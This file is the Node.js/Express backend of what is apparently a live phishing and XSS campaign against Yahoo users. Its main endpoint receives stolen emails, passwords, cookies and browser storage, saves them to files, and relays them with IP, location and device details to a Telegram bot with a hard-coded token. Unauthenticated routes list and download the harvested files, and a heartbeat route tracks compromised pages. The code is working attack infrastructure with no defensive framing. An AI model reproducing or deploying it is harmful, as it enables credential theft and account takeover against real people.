// routes/chukachina.js
const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../cookies');

// Ensure cookies directory exists
async function ensureCookiesDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
  }
}

// Telegram message sending function
async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Sending Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();
    
    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message
    };
  }
}

// Function to create cookies file
async function createCookiesFile(data) {
  await ensureCookiesDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const email = data.email || 'unknown';
  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.json`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  // Save complete data as JSON
  await fs.writeFile(filepath, JSON.stringify(data, null, 2));
  return { filename, filepath };
}

// ==================== ROUTES ====================

// Health check
router.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    service: 'chukachina',
    time: new Date().toISOString(),
    telegramConfigured: !!TELEGRAM_API
  });
});

// File download routes
router.get('/download/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(COOKIES_DIR, filename);
    
    try {
      await fs.access(filepath);
    } catch (error) {
      return res.status(404).json({ 
        success: false, 
        message: "File not found"
      });
    }
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    
    const fileContent = await fs.readFile(filepath, 'utf8');
    res.send(fileContent);
    
  } catch (error) {
    console.error('Error downloading file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file"
    });
  }
});

// List all files
router.get('/files', async (req, res) => {
  try {
    await ensureCookiesDir();
    const files = await fs.readdir(COOKIES_DIR);
    const dataFiles = files.filter(file => file.endsWith('.json'));
    
    res.json({
      success: true,
      totalFiles: dataFiles.length,
      files: dataFiles.map(file => ({
        filename: file,
        downloadUrl: `/chukachina/download/${file}`
      }))
    });
  } catch (error) {
    console.error('Error listing files:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error listing files"
    });
  }
});

// Test Telegram
router.get('/test-telegram', async (req, res) => {
  try {
    const testMessage = `🤖 <b>TEST MESSAGE</b>
    
✅ Server is working!
⏰ Time: ${new Date().toISOString()}
📧 Test successful!`;

    const result = await sendTelegramMessage(testMessage);
    
    res.json({
      success: result.success,
      message: result.success ? 'Telegram message sent!' : 'Failed to send',
      error: result.error
    });
    
  } catch (error) {
    console.error('Telegram test error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// MAIN ENDPOINT - FIXED VERSION with proper validation
router.post('/', async (req, res) => {
  try {
    console.log('=== XSS DATA RECEIVED ===');
    
    // === CRITICAL FIX: Validate req.body first ===
    if (!req.body || typeof req.body !== 'object') {
      console.log('Invalid request body received');
      return res.status(400).json({ 
        success: false, 
        message: "Invalid request body" 
      });
    }
    
    // Safe logging - won't crash if req.body is malformed
    console.log('Request body type:', req.body.type || 'undefined');
    console.log('Data keys:', Object.keys(req.body));

    const { 
      type,
      attack_id,
      credentials,
      cookies,
      localStorage,
      sessionStorage,
      url,
      user_agent,
      timestamp,
      email, // Fallback for credentials
      password // Fallback for credentials
    } = req.body;
    
    // Get IP and location
    const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // Parse user agent
    const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Extract credentials - WITH SAFE ACCESS
    let userEmail = email;
    let userPassword = password;
    
    // FIX: Safe credentials access
    if (credentials && typeof credentials === 'object') {
      userEmail = credentials.username || credentials.email || userEmail;
      userPassword = credentials.password || userPassword;
    }

    if (!userEmail) {
      return res.status(400).json({ 
        success: false, 
        message: "No email/username found in data" 
      });
    }

    // Create data file
    let fileInfo = null;
    try {
      fileInfo = await createCookiesFile(req.body);
      console.log(`Data file created: ${fileInfo.filename}`);
    } catch (fileError) {
      console.error('Error creating data file:', fileError);
    }

    // Build Telegram message based on data type
    let message = '';
    
    if (type === 'yahoo_credentials' || credentials) {
      message = `🔐 <b>YAHOO CREDENTIALS CAPTURED</b>

📧 <b>Email:</b> <code>${userEmail}</code>
🔑 <b>Password:</b> <code>${userPassword || 'N/A'}</code>

🌐 <b>Location Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

📊 <b>Session Data:</b>
├ Cookies: ${cookies ? Object.keys(cookies).length : 0}
├ LocalStorage: ${localStorage ? Object.keys(localStorage).length : 0}
└ Attack ID: ${attack_id || 'N/A'}

🔗 <b>Page:</b> ${url || 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}

💾 <b>File:</b> ${fileInfo ? fileInfo.filename : 'Failed'}`;

    } else if (type === 'initial_theft' || type === 'full_harvest') {
      message = `📦 <b>BROWSER DATA STOLEN</b>

📧 <b>Target:</b> <code>${userEmail || 'Yahoo Login'}</code>

🌐 <b>Location Info:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

📊 <b>Stolen Data:</b>
├ Cookies: ${cookies ? Object.keys(cookies).length : 0}
├ LocalStorage: ${localStorage ? Object.keys(localStorage).length : 0}
├ SessionStorage: ${sessionStorage ? Object.keys(sessionStorage).length : 0}
└ Attack ID: ${attack_id || 'N/A'}

🔗 <b>Page:</b> ${url || 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}`;

    } else {
      // Generic message for other data types
      message = `📡 <b>XSS DATA RECEIVED</b>

📧 <b>Email:</b> <code>${userEmail || 'N/A'}</code>
🔑 <b>Password:</b> <code>${userPassword || 'N/A'}</code>

🌐 <b>Location:</b>
├ IP: <code>${ip}</code>
├ Location: ${locationStr}
└ Device: ${deviceType}

📊 <b>Data Type:</b> ${type || 'unknown'}
🔗 <b>Page:</b> ${url || 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}`;
    }

    // Send to Telegram
    console.log('Sending Telegram notification...');
    const telegramResult = await sendTelegramMessage(message);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // Return success response
    return res.status(200).json({
      success: true,
      message: "Data received successfully",
      telegramSent: telegramResult.success,
      dataType: type,
      attackId: attack_id,
      downloadInfo: fileInfo ? {
        filename: fileInfo.filename,
        downloadUrl: `/chukachina/download/${fileInfo.filename}`,
        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`
      } : null
    });

  } catch (error) {
    console.error("Error in /chukachina:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

// Additional endpoint for heartbeat/persistence data - ALSO FIXED
router.post('/heartbeat', async (req, res) => {
  try {
    // Safe access to req.body
    const { attack_id, url, timestamp, type } = req.body || {};
    
    const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
    
    // Log heartbeat but don't send Telegram for every heartbeat
    console.log(`💓 Heartbeat from ${attack_id || 'unknown'} - IP: ${ip} - URL: ${url || 'N/A'}`);
    
    res.json({
      success: true,
      message: "Heartbeat received",
      attackId: attack_id
    });
    
  } catch (error) {
    console.error("Heartbeat error:", error);
    res.json({ success: true }); // Always return success for heartbeats
  }
});

module.exports = router;